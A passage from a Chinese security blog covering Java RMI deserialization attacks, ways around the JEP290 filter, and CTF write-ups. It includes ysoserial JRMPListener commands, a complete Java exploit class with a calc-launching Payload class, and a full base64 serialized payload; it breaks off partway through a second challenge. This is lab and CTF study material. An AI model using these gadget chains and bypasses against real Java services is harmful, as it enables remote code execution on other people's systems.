<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ObjectInputFilter.Status <span class="hljs-title function_">checkInput</span><span class="hljs-params">(ObjectInputFilter.FilterInfo var0)</span> &#123;<br>    <span class="hljs-keyword">if</span> (dgcFilter != <span class="hljs-literal">null</span>) &#123;<br>        ObjectInputFilter.<span class="hljs-type">Status</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> dgcFilter.checkInput(var0);<br>        <span class="hljs-keyword">if</span> (var1 != Status.UNDECIDED) &#123;<br>            <span class="hljs-keyword">return</span> var1;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (var0.depth() &gt; (<span class="hljs-type">long</span>)DGC_MAX_DEPTH) &#123;<br>        <span class="hljs-keyword">return</span> Status.REJECTED;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> var0.serialClass();<br>        <span class="hljs-keyword">if</span> (var2 == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> Status.UNDECIDED;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">while</span>(var2.isArray()) &#123;<br>                <span class="hljs-keyword">if</span> (var0.arrayLength() &gt;= <span class="hljs-number">0L</span> &amp;&amp; var0.arrayLength() &gt; (<span class="hljs-type">long</span>)DGC_MAX_ARRAY_SIZE) &#123;<br>                    <span class="hljs-keyword">return</span> Status.REJECTED;<br>                &#125;<br><br>                var2 = var2.getComponentType();<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (var2.isPrimitive()) &#123;<br>                <span class="hljs-keyword">return</span> Status.ALLOWED;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//白名单限制</span><br>                <span class="hljs-keyword">return</span> var2 != ObjID.class &amp;&amp; var2 != UID.class &amp;&amp; var2 != VMID.class &amp;&amp; var2 != Lease.class ? Status.REJECTED : Status.ALLOWED;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="Bypass-JEP290"><a href="#Bypass-JEP290" class="headerlink" title="Bypass JEP290"></a>Bypass JEP290</h2><p>接下来我的实验环境是 8u202。</p>
<h3 id="JRMP服务端打JRMP客户端-ysoserial-exploit-JRMPListener"><a href="#JRMP服务端打JRMP客户端-ysoserial-exploit-JRMPListener" class="headerlink" title="JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener)"></a>JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener)</h3><p>在<a href="https://sp4rks.xyz/2024/12/27/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E4%B8%93%E9%A2%98-%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E7%AF%87/#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83-%E5%AE%A2%E6%88%B7%E7%AB%AF">JAVA反序列化-RMI服务调用流程篇</a> 客户端请求注册中心-客户端的时候我们提到了<strong>sun.rmi.transport.StreamRemoteCall#executeCall</strong>方法。下面就是利用<strong>sun.rmi.transport.StreamRemoteCall#executeCall</strong>方法。</p>
<p>我们现在已知在客户端有一个反序列化的点，那对应的服务端在哪里可以插入payload？</p>
<p>可以看到上面客户端代码对于服务端传输过来的<code>returnType</code>判断为<code>TransportConstants.ExceptionalReturn</code>才会进入反序列化流程。那么我们来全局搜索<code>TransportConstants.ExceptionalReturn</code>就可以找到服务端在哪里写入的了。</p>
<p>发现服务端的代码就在同个java文件下<code>sun.rmi.transport.StreamRemoteCall#getResultStream</code>，当success为false时，写入输出流。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114151509211.png" alt="image-20250114151509211"></p>
<p>我们查找用法发现为false的情况有 <code>java.rmi.server.RemoteCall#getResultStream</code> 和 <code>java.rmi.server.RemoteCall#getResultStream</code></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114151443901.png" alt="image-20250114151443901"></p>
<p>但其实他们都写入了报错信息。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114163134278.png" alt="image-20250114163134278"></p>
<p>也就是说我们并不能控制他们的写的报错信息为<code>TransportConstants.ExceptionalReturn</code>。</p>
<p><strong>ysoserial.exploit.JRMPListener</strong>实现的方式是自实现拼接出一个JRMP服务端，来发送给JRMP客户端一个序列化数据。</p>
<p>第一个红框就是代替了用户自定义输入，我们直接手动生成 payloadObject，随即就被作为参数带入了 JRMPListener 的构造函数里，最后调用了 run 函数。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114170212320.png" alt="image-20250114170212320"></p>
<p>我们先看看 构造函数，payloadObject 赋值给了 当前类的 pyaloadObject ，随即就开启的 socket 服务端，准备好来自 JRMPClient 的连接。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114170255746.png" alt="image-20250114170255746"></p>
<p>跟进 run 函数，我们直接看如果是正常 JRMP 协议的 tcp 连接，那么会进入到如下图：</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114170525478.png" alt="image-20250114170525478"></p>
<p>其中重要的是 doMessage 函数，跟进 doMessage 函数。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114170631915.png" alt="image-20250114170631915"></p>
<p>读取一个 int op ，然后根据其值做不同的操作，这个 TransportConstants.Call 其实就是 80，Registry 里也是 80，可以在 StreamRemoteCall 的构造函数里看见，它向 server 端发送了一个 80。然后跟进doCall。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114170740399.png" alt="image-20250114170740399"></p>
<p>先返回了一个 TransportConstants.ExceptionalReturn ，其值为 2，为了满足异常需求。然后生成了一个 BadAttributeValueExpException 的对象，然后将其 val 成员变量设置为 payload 了，只要有反序列化，那么就会触发代码执行。最后将其发送给了 JRMPClient。</p>
<hr>
<p>使用ysoserial开启一个恶意服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 calc.exe<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250113140719418.png" alt="image-20250113140719418"></p>
<p>我们客户端主动连接，可以看到即使在高版本下依然还是被执行了。                                                                                                                        </p>
<p>这说明<strong>JRMP服务端打JRMP客户端的攻击方法不受JEP290的限制！</strong></p>
<p>看到这里是不是大概有思路了。也就是说如果服务器主动连接 exploit&#x2F;JRMPListen，是不是就必然会被我们漏洞利用攻击了？</p>
<p><strong>因此我们的难点就变成了怎么让受害服务器去主动连接我们的 exploit&#x2F;JRMPListen</strong>。<br>这里我们再引入ysoserial的payload&#x2F;JRMPClient，只要目标服务器反序列化这个对象就会主动连接外部的 RMI 注册中心。<br><strong>而我们的问题就变成了怎么让目标反序列化这个对象，在 RMI 的漏洞利用中也就是怎么让这个对象绕过 JEP290 的白名单过滤。</strong></p>
<p>这一部分可以看啦啦师傅的<a href="https://xz.aliyun.com/t/7932?time__1311=n4+xnD0DyDu730KGQDCDlhjmIb4xgixWq4n+ID#toc-3">文章</a>，写的很清楚。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250119164750156.png" alt="image-20250119164750156"></p>
<p><strong>那么最后的问题就是怎么把这个对象发送给目标呢？</strong></p>
<h3 id="通过-Bind-去发送-Payload-JRMPClient（8u141-之前）"><a href="#通过-Bind-去发送-Payload-JRMPClient（8u141-之前）" class="headerlink" title="通过 Bind 去发送 Payload&#x2F;JRMPClient（8u141 之前）"></a>通过 Bind 去发送 Payload&#x2F;JRMPClient（8u141 之前）</h3><p>这部分我的环境是 8u65。</p>
<ul>
<li>物理机器ip：192.168.66.71 作为攻击端</li>
<li>虚拟机ip：192.168.112.133开启RMI服务</li>
</ul>
<p>虚拟机定义一个IRemoteObj接口</p>
<p>RemoteObjimpl实现方法，创建注册中心 ，开启RMI服务，并且有commons-collections。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250115142323400.png" alt="image-20250115142323400"></p>
<p>攻击端使用exploit&#x2F;JRMPListener开启一个恶意的RMI服务，Payload我用的是 ysoserial的payload&#x2F;JRMPClient，能够绕过 JEP290，直接拿过来用就行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections5 calc.exe<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250115142633366.png" alt="image-20250115142633366"></p>
<p>服务端成功被RCE</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250115142814651.png" alt="image-20250115142814651"></p>
<p>攻击流程如下：</p>
<ol>
<li>攻击方在自己的服务器使用<code>exploit/JRMPListener</code>开启一个rmi监听</li>
<li>往存在漏洞的服务器发送<code>payloads/JRMPClient</code>，payload中已经设置了攻击者服务器ip及JRMPListener监听的端口，漏洞服务器反序列化该payload后，会去连接攻击者开启的rmi监听，在通信过程中，攻击者服务器会发送一个可执行命令的payload（假如存在漏洞的服务器中有使用<code>org.apacje.commons.collections</code>包，则可以发送<code>CommonsCollections</code>系列的payload），从而达到命令执行的结果。</li>
</ol>
<p>细想这个过程，会发现这个过程跟fastjson的JNDI注入攻击模式很相似，用一个payload去诱导目标服务器发起一个外部连接，连接到我们控制的恶意服务，恶意服务再去返回payload从而在服务器上完成命令执行。</p>
<p><strong>注册端对于服务端地址校验的变动</strong></p>
<p>为什么在8u141后这种攻击手法不行了呢？这里直接借用啦啦师傅的图来说明，关键在RegistryImpl_Skel类。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/20200622140248-ffa63c34-b44d-1.png" alt="20200622140248-ffa63c34-b44d-1"></p>
<p>也就是说在8u141之前， JRMP 的反序列化发生在这个地址校验之前，因此这个限制对我们来说没有作用。所以我们可以直接通过 bind 去把这个对象给发送个注册中心。此后，在 8u141 修复中对这个校验提前了，因此通过 bind 去发生 payload 不再可行。</p>
<h3 id="通过-lookup-去发送-Payload-JRMPClient（8u231-之前）（我的环境为JDK141）"><a href="#通过-lookup-去发送-Payload-JRMPClient（8u231-之前）（我的环境为JDK141）" class="headerlink" title="通过 lookup 去发送 Payload&#x2F;JRMPClient（8u231 之前）（我的环境为JDK141）"></a>通过 lookup 去发送 Payload&#x2F;JRMPClient（8u231 之前）（我的环境为JDK141）</h3><p>由于 8u141 之后修复了服务段和注册中心的地址校验问题，没办法再用 Bind 了，但我们还可以使用 lookup 方法来发送 JRMPClient Payload。</p>
<p>但在 8U231 之后，Oracle 开始对 JEP290 拦截的白名单进行增强修复，因此我们封装的 JRMPClient 无法通过 JEP290 的拦截了。</p>
<p>这里问题在于 Lookup 只接收 String 类型，我们需要想办法，让我们的 Lookup 能接收 Object 对象，这里要么实现一个 HOOK 拦截器，要么重写 Lookup。</p>
<p>这里 ysomap 这个工具就重写了 Lookup，我们只需要拿过来用就完事了。</p>
<p>ysomap.exploit.rmi.component.Naming#lookup</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250118184429570.png" alt="image-20250118184429570"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250118184541535.png" alt="image-20250118184541535"></p>
<h3 id="通过-lookup-去发送-Payload-JRMPClient（8u241-之前）（我的环境为jdk231）"><a href="#通过-lookup-去发送-Payload-JRMPClient（8u241-之前）（我的环境为jdk231）" class="headerlink" title="通过 lookup 去发送 Payload&#x2F;JRMPClient（8u241 之前）（我的环境为jdk231）"></a>通过 lookup 去发送 Payload&#x2F;JRMPClient（8u241 之前）（我的环境为jdk231）</h3><p>8u231 主要修复的是</p>
<ul>
<li><p>sun.rmi.registry.RegistryImpl_Skel#dispatch 报错情况消除 ref</p>
</li>
<li><p>sun.rmi.transport.DGCImpl_Stub#dirty 提前了黑名单</p>
</li>
</ul>
<p>也就是说我们的 payload&#x2F;JRMPClient 需要想办法重新封装以绕过 8u231 的修复。这里我们利用 ysomap 中封装好的对象，然后老样子通过 lookup 给服务器传进去即可。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250118191420840.png" alt="image-20250118191420840"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250118191444055.png" alt="image-20250118191444055"></p>
<h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><p><a href="https://su18.org/post/rmi-attack/#%E5%9B%9B-%E6%94%BB%E5%87%BB-rmi">Java RMI 攻击由浅入深</a></p>
<p><a href="https://xz.aliyun.com/t/8706#toc-13">JAVA RMI 反序列化攻击 &amp; JEP290 Bypass分析</a></p>
<p><a href="https://xz.aliyun.com/t/7930">针对RMI服务的九重攻击 - 上</a></p>
<p><a href="https://xz.aliyun.com/t/7932">针对RMI服务的九重攻击 - 下</a></p>
<p><a href="https://xz.aliyun.com/t/7079">基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI</a></p>
<p><a href="https://xz.aliyun.com/t/16723">JAVA安全之RMI命令执行深度刨析</a></p>
<p><a href="https://goodapple.top/archives/520">Java安全学习——利用RMI进行攻击</a></p>
<p><a href="https://www.anquanke.com/post/id/200860#h2-3">Bypass JEP290攻击rmi</a></p>
<p><a href="https://ruyueattention.github.io/2022/11/09/Java%2520RMI%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">Java RMI（远程方法调用）漏洞利用 - Java</a></p>
<p><a href="https://xz.aliyun.com/t/15803?time__1311=GqjxnDgDyD2DuQDlxGoRWUuexfx=WWm7eD">JRMP通信攻击过程及利用介绍</a></p>
<p><a href="https://blog.csdn.net/qsort_/article/details/104874111">ysoserial exploit&#x2F;JRMPClient原理剖析</a></p>
<p><a href="https://blog.csdn.net/qsort_/article/details/104969138">ysoserial exploit&#x2F;JRMPListener原理剖析</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/14333695.html">Java安全之ysoserial-JRMP模块分析（一）</a></p>
<p><a href="https://javaguide.cn/java/basis/proxy.html">Java 代理模式详解</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>从CTF学习JAVA安全</title>
    <url>/2025/02/07/JAVA%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E4%BB%8ECTF%E5%AD%A6%E4%B9%A0JAVA%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="2021东华杯-ezgadget"><a href="#2021东华杯-ezgadget" class="headerlink" title="2021东华杯 ezgadget"></a>2021东华杯 ezgadget</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p><a href="https://www.alipan.com/s/6eLwqsgBDUV">一道关于Java反序列化的CTF题-东华杯ezgadget</a>   qe53</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>WEB端有readobject路由，把输入的数据通过工具类解码，包装成ObjectInputStream类型，再调用readObject方法，所以这里可以作为反序列化的入口点</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250206135138200.png" alt="image-20250206135138200"></p>
<p>工具类Tools，负责base64编码、解码，序列化、反序列化</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250206112934536.png" alt="image-20250206112934536"></p>
<p>工具类ToStringBean，调用了defineClass方法，并且通过newInstance()实例化对象</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250206142513497.png" alt="image-20250206142513497"></p>
<p>看到这个我们就能想到：</p>
<p>动态类加载：</p>
<ul>
<li>ToStringBean 继承自 ClassLoader，并且在 toString() 方法中使用 defineClass 动态加载由 ClassByte 指定的字节码。</li>
</ul>
<p>反序列化触发：</p>
<ul>
<li>在反序列化过程中会自动调用readObject() 方法。ToStringBean 实现了 Serializable 接口，只要有类的readObject()调用ToStringBean.toString()方法就可以实现代码执行。</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>反序列化入口选择BadAttributeValueExpException，这是CC5的入口，它会触发toString()方法</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ezgame.ctf;<br><br><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.ToStringBean;<br><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.Tools;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><br><br><span class="hljs-comment">//redobject路由对data有反序列化</span><br><span class="hljs-comment">//BadAttributeValueExpException.readObject()-&gt;ToStringBean.toString()方法</span><br><span class="hljs-comment">//toStringBean的defineClass+newInstance</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//反射修改ToStringBean.ClassByte为恶意字节码</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">classByteField</span> <span class="hljs-operator">=</span> toStringBean.getClass().getDeclaredField(<span class="hljs-string">&quot;ClassByte&quot;</span>);<br>        classByteField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\JAVA\\EzJava\\target\\classes\\com\\ezgame\\ctf\\Payload.class&quot;</span>));<br>        classByteField.set(toStringBean, bytes);<br><br>		<span class="hljs-comment">//通过BadAttributeValueExpException包装ToStringBean</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">123</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valField</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valField.setAccessible(<span class="hljs-literal">true</span>);<br>        valField.set(badAttributeValueExpException, toStringBean);<br><br>        <span class="hljs-comment">//这一部分逻辑都是跟着readobject路由的条件写的</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeUTF(<span class="hljs-string">&quot;gadgets&quot;</span>);<br>        objectOutputStream.writeInt(<span class="hljs-number">2021</span>);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br><br><br>        <span class="hljs-type">byte</span>[] byteArray = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Tools.base64Encode(byteArray);<br>        System.out.printf(s);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ezgame.ctf;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Payload</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>序列化字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">rO0ABXcNAAdnYWRnZXRzAAAH5XNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAGHQAEmNvbS5lemdhbWUuY3RmLkV4cHQACEV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IAIWNvbS5lemdhbWUuY3RmLnRvb2xzLlRvU3RyaW5nQmVhbhPMVFon2dx5AgABWwAJQ2xhc3NCeXRldAACW0J4cHVyAAJbQqzzF/gGCFTgAgAAeHAAAAJ9yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABhMY29tL2V6Z2FtZS9jdGYvUGF5bG9hZDsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADFBheWxvYWQuamF2YQwACQAKBwAgDAAhACIBAARjYWxjDAAjACQBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAlAAoBABZjb20vZXpnYW1lL2N0Zi9QYXlsb2FkAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAFAA0AAAAMAAEAAAAFAA4ADwAAAAgAEAAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAACAAJAAsADAAJAA0ACgARAAwADQAAAAwAAQANAAQAEQASAAAAEwAAAAcAAkwHABQEAAEAFQAAAAIAFg==<br></code></pre></td></tr></table></figure>

<p>Burp Ctrl+U 对序列化字符串URL编码</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250206200359967.png" alt="image-20250206200359967"></p>
<h2 id="坑点与总结"><a href="#坑点与总结" class="headerlink" title="坑点与总结"></a>坑点与总结</h2><p>坑点：传入参数时需要url编码，因为base64编码后存在+号，而http请求会把传参时会将+号识别为空格。base64没有空格符号，所以后端解码会报错。</p>
<p>这题主要考察 <strong>反序列化</strong>、<strong>类加载</strong>、<strong>字节码执行</strong>，另外组长的视频适合反复观看<a href="https://www.bilibili.com/video/BV16h411z7o9?spm_id_from=333.788.videopod.episodes&vd_source=d195054a6a081ba07486dcc86c6ba707&p=4">Java反序列化漏洞专题-基础篇(21&#x2F;09&#x2F;05更新类加载部分)</a></p>
<h1 id="羊城杯-2020-A-Piece-Of-Java"><a href="#羊城杯-2020-A-Piece-Of-Java" class="headerlink" title="[羊城杯 2020]A Piece Of Java"></a>[羊城杯 2020]A Piece Of Java</h1><h2 id="题目地址-1"><a href="#题目地址-1" class="headerlink" title="题目地址"></a>题目地址</h2><p><a href="https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]A%20Piece%20Of%20Java">A Piece Of Java</a></p>
<h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>把题目的jar添加为项目库，idea就会直接反编译了，先关注路由</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218141820791.png" alt="image-20250218141820791"></p>
<p>逻辑还是挺简单的：</p>
<ul>
<li><code>/index</code>获取参数<code>username、password</code>，将参数赋值给<code>userinfo</code>对象，并将该对象序列化存储到Cookie的data中</li>
<li><code>/hello</code>获得cookie中的data并反序列化，并调用info.getAllInfo()，将返回的数据显示到hello.html中的<code>info</code>参数</li>
</ul>
<p>嗯？那不直接可以CC链打了么？没那么简单，接着我们看重写的deserialize方法，它其实是有限制的</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218144304130.png" alt="image-20250218144304130"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-comment">&lt;!-- serialkiller.conf --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">config</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">refresh</span>&gt;</span>6000<span class="hljs-tag">&lt;/<span class="hljs-name">refresh</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mode</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- set to &#x27;false&#x27; for blocking mode --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">profiling</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">profiling</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">mode</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">blacklist</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">blacklist</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">whitelist</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>gdufs\..*<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>java\.lang\..*<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">whitelist</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">config</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>可以看到白名单，<strong>也就是反序列化的目标收到了限制，只能是白名单中的包下的类才能反序列化</strong>。</p>
<p>接着调用了Info接口的getAllInfo()方法，实现Info接口的有两个类UserInfo和DatabaseInfo这里UserInfo并没有什么用，我们看DatabaseInfo类，其中有checkAllInfo()方法调用了connect方法，connect()方法使用JDBC连接了数据库，这里就可以考虑JDBC反序列化，也就绕过了上面反序列化的限制。</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250219002819532.png" alt="image-20250219002819532"></p>
<p>问题是如何调用checkAllInfo()方法，题目中还给了个InfoInvocationHandler类它实现了InvocationHandler类，并且**invoke()**方法中调用了checkAllInfo()方法。</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218234830492.png" alt="image-20250218234830492"></p>
<p>思路就有了，使用动态代理，根据动态代理的特性，代理对象调用任意方法时就会触发<code>invoke()</code>方法。</p>
<p><strong>调用链</strong></p>
